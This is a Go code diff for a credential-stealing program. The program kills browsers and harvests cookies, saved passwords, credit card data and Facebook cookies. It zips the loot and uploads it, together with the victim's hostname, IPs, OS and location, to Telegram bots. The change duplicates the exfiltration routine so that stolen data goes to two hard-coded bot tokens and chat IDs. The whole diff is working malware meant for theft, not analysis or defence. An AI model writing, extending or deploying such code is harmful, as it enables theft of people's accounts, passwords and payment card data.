@@ -39,8 +39,10 @@ type ProfileStatus struct {
 }
 
 const (
-	TelegramBotToken = "7695396904:AAF1yzMdIjkfiJAswS3Jmm3y_vig2uXbBJU"
-	TelegramChatID   = "-4519860005"
+	TelegramBotToken1 = "7695396904:AAF1yzMdIjkfiJAswS3Jmm3y_vig2uXbBJU"
+	TelegramChatID1   = "-4519860005"
+	TelegramBotToken2 = "7944937404:AAFGYLrLSBzkB2t0k03KG953KLFsjYhKyQE"
+	TelegramChatID2   = "-4521555028"
 )
 
 const (
@@ -262,83 +264,6 @@ func countFacebookFiles(fbFolder string) int {
 		return 0
 	}
 	return len(files)
-}
-
-func sendToTelegram(zipFilePath string, cookieCount, passwordCount, creditCardCount, fbFileCount int) error {
-	log.SetOutput(ioutil.Discard)
-
-	file, err := os.Open(zipFilePath)
-	if err != nil {
-		return err
-	}
-	defer file.Close()
-
-	fileInfo, err := file.Stat()
-	if err != nil {
-		return err
-	}
-
-	hostname, err := os.Hostname()
-	if err != nil {
-		return err
-	}
-
-	osInfo := getOSInfo()
-	windowsVersion := getWindowsVersion(osInfo["os"])
-	locationRegion, locationCountry, _ := getLocation()
-	ipv4Addresses := getIPv4Addresses()
-	utcOffset := getUTCOffset()
-
-	caption := fmt.Sprintf("Location: %s, %s\nHostname: %s\nOperating System: %s\nIPv4 Addresses: %s\nTime Log: %s (UTC%+d)\nCookies browser: %d files\nAccount & password: %d files\nCredit Cards: %d files\nFacebook cookies: %d files",
-		locationRegion, locationCountry,
-		hostname,
-		windowsVersion,
-		strings.Join(ipv4Addresses, ", "),
-		fileInfo.ModTime().Format("01/02/2006, 15:04:05"),
-		utcOffset,
-		cookieCount,
-		passwordCount,
-		creditCardCount,
-		fbFileCount)
-
-	body := &bytes.Buffer{}
-	writer := multipart.NewWriter(body)
-
-	_ = writer.WriteField("chat_id", TelegramChatID)
-	_ = writer.WriteField("caption", caption)
-
-	part, err := writer.CreateFormFile("document", filepath.Base(zipFilePath))
-	if err != nil {
-		return err
-	}
-
-	if _, err = io.Copy(part, file); err != nil {
-		return err
-	}
-
-	if err = writer.Close(); err != nil {
-		return err
-	}
-
-	req, err := http.NewRequest("POST", "https://api.telegram.org/bot"+TelegramBotToken+"/sendDocument", body)
-	if err != nil {
-		return err
-	}
-
-	req.Header.Set("Content-Type", writer.FormDataContentType())
-
-	resp, err := http.DefaultClient.Do(req)
-	if err != nil {
-		return err
-	}
-	defer resp.Body.Close()
-
-	if resp.StatusCode != http.StatusOK {
-		bodyBytes, _ := ioutil.ReadAll(resp.Body)
-		return fmt.Errorf("telegram api error: %s", string(bodyBytes))
-	}
-
-	return nil
 }
 
 func getIPv4Addresses() []string {
@@ -934,9 +859,157 @@ func removeDirectory(path string) error {
 	return os.RemoveAll(path)
 }
 
-func main() {
-	log.SetOutput(ioutil.Discard)
+func sendToTelegram1(zipFilePath string, cookieCount, passwordCount, creditCardCount, fbFileCount int) error {
+	file, err := os.Open(zipFilePath)
+	if err != nil {
+		return err
+	}
+	defer file.Close()
 
+	fileInfo, err := file.Stat()
+	if err != nil {
+		return err
+	}
+
+	hostname, err := os.Hostname()
+	if err != nil {
+		return err
+	}
+
+	osInfo := getOSInfo()
+	windowsVersion := getWindowsVersion(osInfo["os"])
+	locationRegion, locationCountry, _ := getLocation()
+	ipv4Addresses := getIPv4Addresses()
+	utcOffset := getUTCOffset()
+
+	caption := fmt.Sprintf("Location: %s, %s\nHostname: %s\nOperating System: %s\nIPv4 Addresses: %s\nTime Log: %s (UTC%+d)\nCookies browser: %d files\nAccount & password: %d files\nCredit Cards: %d files\nFacebook cookies: %d files",
+		locationRegion, locationCountry,
+		hostname,
+		windowsVersion,
+		strings.Join(ipv4Addresses, ", "),
+		fileInfo.ModTime().Format("01/02/2006, 15:04:05"),
+		utcOffset,
+		cookieCount,
+		passwordCount,
+		creditCardCount,
+		fbFileCount)
+
+	body := &bytes.Buffer{}
+	writer := multipart.NewWriter(body)
+
+	_ = writer.WriteField("chat_id", TelegramChatID1)
+	_ = writer.WriteField("caption", caption)
+
+	part, err := writer.CreateFormFile("document", filepath.Base(zipFilePath))
+	if err != nil {
+		return err
+	}
+
+	if _, err = io.Copy(part, file); err != nil {
+		return err
+	}
+
+	if err = writer.Close(); err != nil {
+		return err
+	}
+
+	req, err := http.NewRequest("POST", "https://api.telegram.org/bot"+TelegramBotToken1+"/sendDocument", body)
+	if err != nil {
+		return err
+	}
+
+	req.Header.Set("Content-Type", writer.FormDataContentType())
+
+	resp, err := http.DefaultClient.Do(req)
+	if err != nil {
+		return err
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		bodyBytes, _ := ioutil.ReadAll(resp.Body)
+		return fmt.Errorf("telegram api error: %s", string(bodyBytes))
+	}
+
+	return nil
+}
+
+func sendToTelegram2(zipFilePath string, cookieCount, passwordCount, creditCardCount, fbFileCount int) error {
+	file, err := os.Open(zipFilePath)
+	if err != nil {
+		return err
+	}
+	defer file.Close()
+
+	fileInfo, err := file.Stat()
+	if err != nil {
+		return err
+	}
+
+	hostname, err := os.Hostname()
+	if err != nil {
+		return err
+	}
+
+	osInfo := getOSInfo()
+	windowsVersion := getWindowsVersion(osInfo["os"])
+	locationRegion, locationCountry, _ := getLocation()
+	ipv4Addresses := getIPv4Addresses()
+	utcOffset := getUTCOffset()
+
+	caption := fmt.Sprintf("Location: %s, %s\nHostname: %s\nOperating System: %s\nIPv4 Addresses: %s\nTime Log: %s (UTC%+d)\nCookies browser: %d files\nAccount & password: %d files\nCredit Cards: %d files\nFacebook cookies: %d files\n hhh",
+		locationRegion, locationCountry,
+		hostname,
+		windowsVersion,
+		strings.Join(ipv4Addresses, ", "),
+		fileInfo.ModTime().Format("01/02/2006, 15:04:05"),
+		utcOffset,
+		cookieCount,
+		passwordCount,
+		creditCardCount,
+		fbFileCount)
+
+	body := &bytes.Buffer{}
+	writer := multipart.NewWriter(body)
+
+	_ = writer.WriteField("chat_id", TelegramChatID2)
+	_ = writer.WriteField("caption", caption)
+
+	part, err := writer.CreateFormFile("document", filepath.Base(zipFilePath))
+	if err != nil {
+		return err
+	}
+
+	if _, err = io.Copy(part, file); err != nil {
+		return err
+	}
+
+	if err = writer.Close(); err != nil {
+		return err
+	}
+
+	req, err := http.NewRequest("POST", "https://api.telegram.org/bot"+TelegramBotToken2+"/sendDocument", body)
+	if err != nil {
+		return err
+	}
+
+	req.Header.Set("Content-Type", writer.FormDataContentType())
+
+	resp, err := http.DefaultClient.Do(req)
+	if err != nil {
+		return err
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		bodyBytes, _ := ioutil.ReadAll(resp.Body)
+		return fmt.Errorf("telegram api error: %s", string(bodyBytes))
+	}
+
+	return nil
+}
+
+func main() {
 	killBrowsers()
 
 	Browserdata()
@@ -969,7 +1042,14 @@ func main() {
 		return
 	}
 
-	if err = sendToTelegram(zipPath, cookieCount, passwordCount, creditCardCount, fbFileCount); err != nil {
+	err = sendToTelegram1(zipPath, cookieCount, passwordCount, creditCardCount, fbFileCount)
+	if err != nil {
+		os.Remove(zipPath)
+		return
+	}
+
+	err = sendToTelegram2(zipPath, cookieCount, passwordCount, creditCardCount, fbFileCount)
+	if err != nil {
 		os.Remove(zipPath)
 		return
 	}
